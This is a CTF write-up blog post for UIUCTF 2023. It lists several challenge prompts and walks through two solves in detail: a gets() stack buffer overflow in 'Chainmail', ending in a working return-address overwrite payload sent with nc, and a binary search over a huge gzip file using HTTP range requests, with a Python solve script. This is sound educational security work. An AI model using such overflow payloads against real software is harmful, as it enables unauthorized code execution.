---
title: UIUCTF 2023 Writeups
---

# UIUCTF 2023 Writeups
## Overview
Last weekend, our *rival* Sigpwny hosted their UIUCTF. We ranked 24th in the end. I solved 6 crypto, 4 reverse, and 1 pwn. This post will go through some of my solves in details. Hopefully this can serve as a tutorial for simular challenges in the future.

Challenge solved after the competition are marked as \[\*\] 

<!--more-->

There will also be brief note on other challenge solved, though not as in depth.
## Crypto
### Three-Time Pad
```text
We've been monitoring our adversaries' communication channels, but they encrypt their data with XOR one-time pads! However, we hear rumors that they're reusing the pads...

closed are three encrypted messages. Our mole overheard the plaintext of message 2. Given this information, can you break the enemy's encryption and get the plaintext of the other messages?

Author: Pomona
Solves: 390
```

### At Home
```text
Mom said we had food at home

Author: Anakin
Solves: 316
```

### Group Project(ion)
```text
Group Project
In any good project, you split the work into smaller tasks...

nc group.chal.uiuc.tf 1337
---
Group Projection
I gave you an easier project last time. This one is sure to break your grade!

nc group-projection.chal.uiuc.tf 1337

Author: Anakin
Solves: 232 (ver1)/ 127 (ver2)
```

### Morphing Time
```text
The all revealing Oracle may be revealing a little too much...

nc morphing.chal.uiuc.tf 1337

Author: Anakin
Solves: 140
```

### Crack The Safe
```text
I found this safe, but something about it seems a bit off - can you crack it?

Author: Anakin
Solves: 62
```

## Reversing
### vmwhere
```text
Usage: ./chal program

Author: richard
Solves: 124 (ver1)/ 66 (ver2)
```
### geoguesser
```text
I thought geoguesser was too easy, so I made it harder.

Usage: janet -i program.jimage

nc geoguesser.chal.uiuc.tf 1337

Author: richard
Solves: 38
```

### Fast Calculator
```text
Check out our new super fast calculator!

This challenge is sponsored by Battelle.

Author: Minh
Solves: 36
```

## Pwn
### Chainmail
```text
I've come up with a winning idea to make it big in the Prodigy and Hotmail scenes (or at least make your email widespread)!

nc chainmail.chal.uiuc.tf 1337

Author: Emma
Solves: 256
```
{% capture chainmail_c %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void give_flag() {
    FILE *f = fopen("/flag.txt", "r");
    if (f != NULL) {
        char c;
        while ((c = fgetc(f)) != EOF) {
            putchar(c);
        }
    }
    else {
        printf("Flag not found!\n");
    }
    fclose(f);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char name[64];
    printf("Hello, welcome to the chain email generator! Please give the name of a recipient: ");
    gets(name);
    printf("Okay, here's your newly generated chainmail message!\n\nHello %s,\nHave you heard the news??? Send this email to 10 friends or else you'll have bad luck!\n\nYour friend,\nJim\n", name);
    return 0;
}
```
{% endcapture %}
{% include widgets/toggle-field.html toggle-name="chainmail_c" button-text="Show chal.c" toggle-text=chainmail_c %}

In this challenge, we are given the source code. The challenge ask for a user input using gets, then print out the string after some formating. Notice that the input is taken using `gets`, this is a particularly dangerous function to use. Even the compiler warns you when using this function. But why is `gets` dangerous?

```
chainmail$ gcc chal.c -o chal
chal.c: In function main:
chal.c:27:5: warning: implicit declaration of function gets; did you mean fgets? [-Wimplicit-function-declaration]
   27 |     gets(name);
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/ccOKvDUG.o: in function `main':
chal.c:(.text+0x103): warning: the `gets' function is dangerous and should not be used.
```

Well according to the functional specification, `gets` will keep reading input until a newline. This means that you can enter hundrads of characters and the function will not stop you. This combined with a finite buffer size means like you can control data on the stack.

There are a lot of useful thing stored on the stack, like the saved rbp to restore stack frame, and various local variable. But the most interesting one for exploitation purposes is the saved rip, which tells the program where to return back when this function ends. If we overwrite this value, the program will thing that this function is called by some weird location that we tell it, and resume execute from that location. 

Now we know the vulnerability, let's see how we can exploit this. We first check what protections are enabled on the compiled binary.

```bash
chainmail$ checksec ./chal
[*] '/mnt/c/Users/brons/ctf/uiucctf2023/chainmail/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Seems like only NX is enabled, which stands for Not-eXecutable stack. Since there is a function that print out the flag for us, this doesn't matter for us. All we need to do is to redirect the control flow to the start of this function and it will give us the flag. If you want to learn more detail stack buffer overflow and how the function redirection works, [this video by LiveOverflow](https://youtu.be/8QzOC8HfOqU) is a great learning resource. Personally I learn a lot of the fundamentals from [his playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) as well. 

There are a lot of methods to find the location of give_flag, like opening in ghidra or use cli tools like readelf
```bash
chainmail$ readelf -s ./chal|grep give_flag
    27: 0000000000401216   114 FUNC    GLOBAL DEFAULT   15 give_flag
```

From this we can craft a payload: 64 `a`s to fill the buffer, another 8  `a` as padding for saved rbp, and the print flag location in bytes ("\x16\x12\x40\x00\x00\x00\x00\x00") for the save rip. This will overflow the stack, and after the main function ends, it will call the print flag function for us and this should print the flag, right?

If we send this payload, you'll notice that it didn't work, if we check with gdb you'll notice that it segfault at some location. This is caused by stack alignment. In [x86-64 abi convention](https://learn.microsoft.com/en-us/cpp/build/stack-usage?view=msvc-170#stack-allocation), it requires the caller to maintain a 16 byte stack alignment. Quoted:

| The stack will always be maintained 16-byte aligned, except within the prolog (for example, after the return address is pushed), and except where indicated in Function Types for a certain class of frame functions.

But when we are calling the give_flag function, the stack actually isn't aligned. This cause some libc function to freak out and break. 

One way to fix this is to jump over the first `push rbp` instruction in give_flag. So instead of jumping to 0x401216, we'll jump to 0x40121b. This aligns the stack and the program will no longer segfault. Another way is to insert a ret ROP gadget to move the stack down 0x8 byte, but I'll omit the discussion about this technique here.

With that, all we need is to send the payload to remote and profit =D (See blow for the log of sending the payload to remote.)

flag:  `uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}`

```
chainmail$ echo -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x12\x40\x00\x00\x00\x00\x00' | nc chainmail.chal.uiuc.tf 1337
== proof-of-work: disabled ==
Hello, welcome to the chain email generator! Please give the name of a recipient: Okay, here's your newly generated chainmail message!

Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,
Have you heard the news??? Send this email to 10 friends or else you'll have bad luck!

Your friend,
Jim
uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}
```

## Web
### Future Disk 1/2 [*]
#### Overview

```text
Ver 1:
I'm from the year 2123. Here's what I did:

-    Mounted my 10 exabyte flash drive
-    fallocate -l 8E haystack.bin
-    dd if=flag.txt bs=1 seek=[REDACTED] conv=notrunc of=haystack.bin
-    gzip haystack.bin
-    Put haystack.bin.gz on my web server for you to download

HTTP over Time Travel is a bit slow, so I hope gzipping it made it a little faster to download :)
https://futuredisk-web.chal.uiuc.tf/haystack.bin.gz

---
Ver 2:
Like futuredisk, but a little worse.

https://futuredisk2-web.chal.uiuc.tf/haystack2.bin.gz
---

Author: kuilin
Solves: 22 (Ver 1)/ 8 (Ver 2)
```
**Disclaimer**: I only solve this challenge (both version) after the competition. In the final solve, I already know that block alignment can be used for binary serach, and I know the block size pattern for part 2. 

In this challenge, we see that the flag is placed in a gigantic file, compressed, then placed on a file server for us to download. But how are we suppose to download this file? Even if we have the storage, there's no way we can recieve the file through the network. Clearly with this large of the file, we must have some way to efficiently search through it or to get a index of the flag by inspecting a known part of the file. 

#### Observation 
But first, we need to know what primitives we have. Let's start with a basic recon. I start with curl with `-v` flag to get more information. 
```
futuredisk$ curl -v -N https://futuredisk-web.chal.uiuc.tf/haystack.bin.gz --output - > /dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 34.72.163.149:443...
[...]
> GET /haystack.bin.gz HTTP/2
> Host: futuredisk-web.chal.uiuc.tf
> user-agent: curl/7.68.0
> accept: */*
>
[...]
< HTTP/2 200
< accept-ranges: bytes
< content-type: application/octet-stream
< date: Thu, 06 Jul 2023 02:26:50 GMT
< etag: "1209f04b4-7fffffffffffffff"
< last-modified: Sat, 12 Jun 2123 16:07:16 GMT
< server: nginx/1.23.1
< content-length: 9223372036854775807
<
{ [5 bytes data]
  0 8191P    0  3813    0     0   2662      0 40102175  0:00:01 40102175  2664^C
```
From the trace, we can see that the full file will be 9223372036854775807 bytes, so yeah it's impossible to get the full thing.

After some digging, I found the `--continued-at` argument to curl, which allow a user to start downloading from some offset. Looking at the log again, I notice that this is made possible by sending the `range` header. For example, if we include `range: bytes=1-10`, the server will only send bytes from byte 1 to 10. This basically allow the sender to decide what range of bytes the user wants to download from. More information about the range header can be found [here](https://http.dev/range)

To utilized this, I wrote a helper function using python's requests library. This will be used later.
```
# helper function to get bytes of certain range
# using the range header
def get_range(st, ed):
    headers = {'range':f"bytes={st}-{ed}"}
    print(headers)
    res = requests.get(url, headers=headers)
    return res._content # return raw bytes
```
#### File Strucutre
Now let's inspect the actual file itself, well only part of it of course. We know that the file is compressed using gzip, maybe we can start by looking into the format for that. While searching up the header format, I found [this website](https://commandlinefanatic.com/cgi-bin/showarticle.cgi?article=art053) that goes into great detail in disecting a gzip file. This website is extremely helpful for me in understanding the file structure. We know that after the file header, the data is split into blocks, with each block having its own header and compression methods. I also found [this blog](https://pyokagan.name/blog/2019-10-18-zlibinflate/) that implements the deflate method in python so I can play around with it a little bit.

After augmenting the inflate code, I get to look at the huffman tables / block sizes / inflated sizes and some other information related to each block. Using the start of each file, we can observe the block sizes of each block. 
```
futuredisk$ decode.py haystack1.gz
block 1: 193 bits
block 2: 65635 bits
block 3: 65634 bits
block 4: 65634 bits
block 5: 65634 bits
[...]
futuredisk$ decode.py haystack2.gz
block 1: 193 bits
block 2: 65635 bits
block 3: 106 bits
block 4: 108 bits
block 5: 110 bits
block 6: 112 bits
block 7: 114 bits
block 8: 116 bits
[...]
```

#### Binary Search
We can imaging the situation a little bit, lets say the flag is in the 10th block in a 20 block file. Since the file is mostly zero, we can assume the first 9 blocks will follow a pretty regular sequence. then there will be one block of a irregular size to store the flag, and the rest of the block back to the regular format. This means that if we can find the block header at the location we expects it, we haven't reach the block containing the flag. Conversely, if we can't find the block header, we have passed the flag block. The only challenge now is to calculate where the header bytes are.
#### Index calculation
For version 1, it's simple as all blocks have the same size, so it's a simple multiplication. For version 2, I'll describe how I would have discover the pattern myself.

Firstly from the starting block, we know that after the first two block, it's a steadily increasing sequence from 106 bit, I'll just assume that this is the correct format and run the binary search with this formula. When it gets to the "flag" block, we can print out the following few blocks, and observe the pattern from there. For example, after the first block, the decrypted block size is as follow.
```
futuredisk$ solve.py 
[...]
32765
Found!!!
block 32765: 65634 bits
block 32766: 108 bits
block 32767: 110 bits
block 32768: 112 bits
```
And slowly the block size format can be discovered. The bit length format is as follow, where each number is a block.
```
# 106 108 110 ... 65634
#     108 110 ... 65634
#         110 ... 65634
#             ... 65634
#                 65634
# 106 108 110 ... 65634
#     108 110 ... 65634
#         110 ... 65634
#             ... 65634
#                 65634
# ... repeat
# 106 108 110 ... 65634
#     108 110 ... 65634
#         110 ... 65634
#             ... 65634
#                 65634
```
Given this format, it's simple to come up with ways to calculate the block location with some math, I'll omit the details here, but the detail can be found in the solve script.

After that, combined with our primitive, we can query for the flag location using binary search, and get the flag in the end.


Version1: `uiuctf{binary search means searching a binary stream, right :D}`

Version2: `uiuctf{i sincerely hope that was not too contrived, deflate streams are cool}`


{% capture future_disk_solve %}
```py
# deflate taken from https://pyokagan.name/blog/2019-10-18-zlibinflate/
# modified to print out bit count of each block
import deflate
import requests
import math

VER = 2
if VER == 1:
    f = open("haystack1.gz", "rb").read()
else:
    f = open("haystack2.gz", "rb").read()

## check bit count of starting blocks
#content = deflate.BitReader(f)
#content.read_bytes(10)
#s = deflate.inflate(content, 10)

if VER == 1:
    url = "https://futuredisk-web.chal.uiuc.tf/haystack.bin.gz"
else:
    url = "https://futuredisk2-web.chal.uiuc.tf/haystack2.bin.gz"

# helper function to get bytes of certain range
# using the range header
def get_range(st, ed):
    headers = {'range':f"bytes={st}-{ed}"}
    print(headers)
    res = requests.get(url, headers=headers)
    return res._content

# count bits / bytes up to the given block index
def sum_block_size(idx):
    if VER == 1:
        # Fix block bits size
        bitcount = 87 + 65634*(idx-1)

    else:
        bitcount = 87 + 65634
        # bit len format:
        # 106 108 110 ... 65634
        #     108 110 ... 65634
        #         110 ...
        # =
        # 1 2 3 ... 32765
        #   2 3 ... 32765
        #     3 ... 32765
        # * 2 + 105 * n
        m = 32765
        actual_idx = idx-2
        big_cycle = actual_idx // (m * (m+1)//2)

        # iter count
        # 32765 + 32764 + ...
        # (32765 + (32766-x))*x//2 > actual_idx > (32765 + (32766 - (x-1)))*(x-1)//2
        big_cycle_bits = (m * (m+1) * (2*m+1))//6
        big_cycle_bits *= 2
        big_cycle_bits += 104 * (m * (m+1)//2)
        bitcount += big_cycle * big_cycle_bits

        remain = actual_idx % (m * (m+1)//2)
        cycle = 0
        total = 0
        while total + m - cycle < remain:
            st = 106 + cycle * 2
            ct = m - cycle
            ed = st + ct * 2  - 2
            total += ct
            bitcount += (st + ed) * (ct) // 2
            cycle += 1

        remain -= total
        st = 106 + cycle * 2
        ed = 106 + cycle * 2 + remain * 2 - 2
        bitcount += (st + ed) * (remain) // 2
    return bitcount, bitcount//8

## Verify the block size get is correct
# for i in range(32760, 32780):
#     print(i, sum_block_size(i), get_range(sum_block_size(i)[1], sum_block_size(i)[1]+10))

## Binary Search for flag using alignment
# VER 1
# block = 362917535825829
# VER 2
# block = 1142943246527020
st = 0
ed = 9223372036854775807
while st<ed:
    mid = (st+ed)//2
    st_idx = sum_block_size(mid)[1]
    if st_idx > 9223372036854775807:
        ed = mid-1
        continue
    res = get_range(st_idx, st_idx+10)
    print(mid, res.hex())
    if len(set(res)) == 1:
        ed = mid
    else:
        st = mid+1

# decode flag
print(st, ed)
flag_loc = st-1
flag_block = get_range(sum_block_size(flag_loc)[1], sum_block_size(ed+1)[1])
print(len(flag_block))
offset = (sum_block_size(flag_loc)[0]%8)
print(offset)
flag = deflate.BitReader(flag_block)
flag.read_bits(offset)
flag_inflated = deflate.inflate(flag, 1)
print(flag_inflated)

# VER 1
#uiuctf{binary search means searching a binary stream, right :D}
# VER 2
#uiuctf{i sincerely hope that was not too contrived, deflate streams are cool}
```
{% endcapture %}
{% include widgets/toggle-field.html toggle-name="future_disk_solve" button-text="Show solve.py" toggle-text=future_disk_solve %}
